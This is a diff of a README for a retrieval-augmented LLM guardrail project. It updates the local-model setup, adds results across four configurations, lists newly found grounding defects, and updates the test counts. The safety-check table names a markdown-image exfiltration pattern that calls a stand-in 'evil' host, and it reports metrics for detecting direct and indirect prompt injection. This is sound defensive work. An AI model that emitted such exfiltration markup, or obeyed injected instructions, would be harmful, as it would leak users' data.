@@ -144,10 +144,16 @@ LLM_API_KEY=sk-...
 EMBEDDING_PROVIDER=openai
 EMBEDDING_DIMENSIONS=1536      # must match the model; re-ingest after changing
 
-# Fully local
+# Fully local — no key, no per-token cost. This exact configuration is the
+# one the real-model numbers in docs/evaluation.md were measured with.
+#   ollama pull llama3.2:3b && ollama pull nomic-embed-text
 LLM_PROVIDER=ollama
-LLM_MODEL=llama3.1:8b
+LLM_MODEL=llama3.2:3b
 LLM_BASE_URL=http://localhost:11434
+EMBEDDING_PROVIDER=ollama
+EMBEDDING_MODEL=nomic-embed-text
+EMBEDDING_DIMENSIONS=768       # must match the model; re-ingest after changing
+EMBEDDING_BASE_URL=http://localhost:11434
 ```
 
 <details>
@@ -273,17 +279,17 @@ extraction as a *hallucination* and lose the signal.
 | **Schema** | A hijacked model usually stops producing valid JSON — a detection signal, not just hygiene |
 | **Citations** | Hallucinated indices, quotes not present in the cited chunk, uncited answers |
 | **Safety** | System-prompt leakage (5-gram containment), instruction echo, `![](https://evil/?d=…)` exfiltration |
-| **Grounding** | Claim-level support: word overlap + **numeric agreement** + n-gram containment + polarity |
+| **Grounding** | Claim-level support: word overlap + **numeric agreement** + n-gram containment + polarity; optional **cross-encoder NLI** (`GROUNDING_METHOD=nli\|hybrid`) |
 | **PII** | Regex **plus checksums** — Luhn, Verhoeff, mod-97, SSN structure |
 
 Measured grounding behaviour:
 
 | Answer | Score | Outcome |
 |---|---|---|
-| Supported paraphrase | 0.86 | pass |
+| Supported paraphrase | 0.80 | pass |
 | Explicit refusal | 1.00 | pass — asserts nothing |
-| Wrong number (30 vs 24 days) | 0.22 | **blocked** |
-| Contradiction (*"may **not** carry forward"*) | 0.16 | **blocked** |
+| Wrong number (30 vs 24 days) | 0.20 | **blocked** |
+| Contradiction (*"may **not** carry forward"*) | 0.19 | **blocked** |
 
 **Why checksums for PII?** "Sixteen digits" matches an invoice number. Without
 Luhn, `redact` mode destroys ordinary answers and gets turned off:
@@ -357,31 +363,55 @@ curl -X POST localhost:8000/api/v1/evaluation/run -H "Authorization: Bearer $TOK
 exist, and one document belongs to the second, so an authorisation leak would
 show up as a failure.
 
-**Results** (offline config: `echo` + `hashing`, hybrid retrieval, top-k 5,
-run against PostgreSQL + pgvector):
+**Results** — measured across four configurations. `echo`/`hashing` are the
+offline stand-ins; `llama3.2:3b` + `nomic-embed-text` run locally through Ollama
+on a 4-core CPU with no GPU. Full tables and methodology in
+[docs/evaluation.md](docs/evaluation.md).
 
-| Metric | Result |
-|---|---|
-| Overall pass rate | **43/45 (95.6%)** |
-| Attack detection rate | **100%** (16/16) |
-| False positive rate | **0%** (0/18) |
-| Indirect injection detection | 100% (1/1 poisoned chunks) |
-| Quarantine precision | 100% (0 clean chunks wrongly held) |
-| Citation accuracy | 100% |
-| Retrieval recall@5 | 1.000 |
-| Mean latency | ~46 ms |
+| Metric | offline | offline + NLI | llama3.2:3b | + NLI |
+|---|---|---|---|---|
+| Overall pass rate | 43/45 | 43/45 | 44/45 | **45/45** |
+| Attack detection rate | **100%** | **100%** | **100%** | **100%** |
+| False positive rate | **0%** | **0%** | **0%** | **0%** |
+| Indirect injection detection | 100% | 100% | 100% | 100% |
+| Quarantine precision | 100% | 100% | 100% | 100% |
+| Faithfulness | 1.000 | 1.000 | 0.842 | **0.965** |
+| Answer relevance | 0.692 | 0.696 | 0.783 | 0.771 |
+| Answer correctness | 80% | 80% | **100%** | **100%** |
+| Citation accuracy | 100% | 100% | 100% | 100% |
+| Benign refusal rate | 39% | 44% | **6%** | 11% |
+| Retrieval recall@5 | 1.000 | 1.000 | 1.000 | 1.000 |
+| Mean latency | 20 ms | 412 ms | 16.9 s | 17.3 s |
 
 **How to read this.** Eighteen of the cases are benign inputs *engineered to
 look suspicious* — a dataset of attacks alone measures detection while hiding
 its cost. Detection rate is meaningless without the false-positive rate beside
 it; a detector that blocks everything scores 100%.
 
-**Security metrics are provider-independent** — pattern matching, noisy-OR
-arithmetic, SQL predicates and checksums behave identically whichever model is
-plugged in. **Answer-quality metrics are a floor**, measured with an extractive
-stub, and the report says so on every run.
+**The security row does not move.** Detection, false positives, indirect
+detection and quarantine precision are identical across an offline stub and a
+real model, and identical again across SQLite and PostgreSQL. That is the claim
+this project makes, measured rather than asserted: those controls are
+deterministic server-side code, so swapping the model cannot weaken them.
 
-**The suite found seven real defects**, all documented in
+**Everything downstream of generation does move**, which is why the real-model
+columns exist. Note that faithfulness *falls* from 1.000 to 0.842 with a real
+model — that is a better result, not a worse one: the extractive stub is
+verbatim by construction, so the metric was measuring nothing. NLI recovers it
+to 0.965 by scoring paraphrase properly.
+
+**45/45 should not be read as NLI fixing the last case** — it did not; see
+[finding 8](docs/evaluation.md). And the benign refusal rate is in the table
+because a guardrail can buy faithfulness by answering less, and that trade is
+invisible in a pass rate.
+
+**The real-model columns are single observations.** At temperature 0 on CPU,
+llama.cpp is not bit-reproducible — across three identical runs, 1 case in 12
+changed outcome. The 44/45 vs 45/45 difference is inside that noise; the
+faithfulness gap is an order of magnitude larger than it. The offline columns
+are exactly reproducible, which is the argument for keeping them.
+
+**The suite found eleven real defects**, all documented in
 [docs/evaluation.md](docs/evaluation.md):
 
 1. **Grounding measures support, not relevance** — a verbatim-but-irrelevant
@@ -412,8 +442,32 @@ have caught, because they live in the dialect-specific half of the code:
    configuration fault, so it now surfaces as a named `/health/ready` check
    reporting both numbers.
 
-The two remaining evaluation failures are conservative — the system refused
-rather than answering wrongly, which is the correct direction to fail.
+Running against a **real local model** (llama3.2:3b via Ollama) then found four
+more that the deterministic stub structurally could not:
+
+8. **The polarity check refused correct answers.** A source sentence asserting
+   one thing and denying another — *"granted at 12 days per calendar year **and
+   does not carry forward**"* — made the correct concise answer *"12 days per
+   calendar year"* read as a contradiction, scoring 0.20 and being withheld.
+   The extractive stub returns whole sentences, negated clause included, so its
+   polarity always matched and every offline run scored this case 1.000. Two
+   obvious fixes each broke a different case before clause-to-clause comparison
+   on **both** sides fixed all of them.
+9. **The numeric gate did not gate.** The cap for a fabricated figure (0.50) sat
+   *above* the support floor (0.45), so a confident NLI entailment lifted a
+   wrong number from 0.42 (blocked on lexical alone) to 0.50 (**allowed**) —
+   the better model made that case worse. The ceiling is now derived from the
+   floor and an import-time assertion stops it inverting again.
+10. **NLI's measured value is invisible on the offline stub.** Faithfulness is
+    already 1.000 there because extractive answers are verbatim, so the feature
+    looked worthless until it was measured against a model that paraphrases.
+11. **A single real-model run is not a measurement.** Temperature 0 is not
+    deterministic on CPU — across three identical runs, 1 case in 12 changed
+    outcome. Caught by re-running rather than by trusting one number, which
+    stopped a noise-level difference being written up as an NLI result.
+
+The remaining evaluation failures are conservative — the system refused rather
+than answering wrongly, which is the correct direction to fail.
 
 ---
 
@@ -501,6 +555,8 @@ that matter most:
 | `EMBEDDING_DIMENSIONS` | `384` | **Must match the model and the migrated column** |
 | `INJECTION_BLOCK_THRESHOLD` | `0.75` | Lowering raises detection *and* false positives — measure first |
 | `GROUNDING_MIN_SCORE` / `GROUNDING_MODE` | `0.45` / `block` | `block` withholds unsupported answers |
+| `GROUNDING_METHOD` | `lexical` | `lexical` \| `nli` \| `hybrid` — the last two need `requirements-optional.txt` |
+| `ANSWER_RELEVANCE_ENABLED` | `true` | Evaluation metric only; nothing is blocked on it |
 | `PII_DETECTION_MODE` | `redact` | `off` \| `warn` \| `redact` \| `block` |
 | `RETRIEVAL_MODE` | `hybrid` | `vector` \| `keyword` \| `hybrid` |
 | `FAIL_CLOSED` | `true` | A guardrail error blocks the request |
@@ -511,7 +567,7 @@ that matter most:
 
 ```bash
 cd backend
-pytest                      # 429 tests (PostgreSQL tests skip without a server)
+pytest                      # 488 tests (PostgreSQL and NLI tests skip when unavailable)
 pytest tests/security -v    # 171 adversarial tests
 pytest -m "security"        # by marker: unit · integration · security · api
 ruff check . && ruff format --check .
@@ -522,9 +578,9 @@ npm run lint && npm run typecheck
 
 | Suite | Tests | Covers |
 |---|---|---|
-| `unit` | 72 | Chunking · parsing · cleaning · prompts · citations · schemas |
-| `integration` | 80 | Ingestion · retrieval · authorisation · dashboard · **pgvector backends** |
-| `security` | 171 | Injection · evasion · indirect injection · PII · grounding · rate limits |
+| `unit` | 99 | Chunking · parsing · cleaning · prompts · citations · schemas · answer relevance |
+| `integration` | 85 | Ingestion · retrieval · authorisation · dashboard · **pgvector backends** |
+| `security` | 211 | Injection · evasion · indirect injection · PII · grounding · **NLI entailment** · rate limits |
 | `api` | 106 | Every endpoint · auth · ownership · error envelope |
 
 Tests run against **SQLite via the real Alembic migrations** — no Postgres
@@ -593,9 +649,14 @@ Stated plainly, because a security project that claims completeness is not one:
    in SQL and grounding is verified after generation: those hold even when
    detection fails.
 2. **Grounding measures support, not relevance** — found by the evaluation
-   suite. A verbatim-but-irrelevant quotation scores 1.000.
-3. **Grounding is lexical, not entailment** — a cross-encoder NLI model is the
-   documented upgrade path.
+   suite. A verbatim-but-irrelevant quotation scores 1.000. Relevance is now
+   *measured* (see below), but deliberately not enforced: an irrelevant answer
+   is a quality failure, not a safety one, and blocking on it would add false
+   refusals without adding security.
+3. **Grounding is lexical by default** — `GROUNDING_METHOD=nli|hybrid` adds
+   cross-encoder entailment, at the cost of ~2 GB of torch. NLI has its own
+   blind spot on numbers, so the lexical numeric gate stays authoritative in
+   every mode; neither is an entailment *proof*.
 4. **PII detection misses names and addresses** — it is patterns + checksums,
    not NER. `PII_ENGINE=presidio` adds that.
 5. **Rate limiting is per-process** — with N workers the real limit is N × limit.
@@ -609,8 +670,6 @@ Stated plainly, because a security project that claims completeness is not one:
 
 ## Future improvements
 
-- Cross-encoder NLI for entailment-based grounding
-- An **answer-relevance** check alongside grounding (limitation 2)
 - Redis-backed rate limiting and a Celery ingestion worker
 - Conversational query rewriting for follow-up questions
 - Presidio enabled by default with a bundled spaCy model
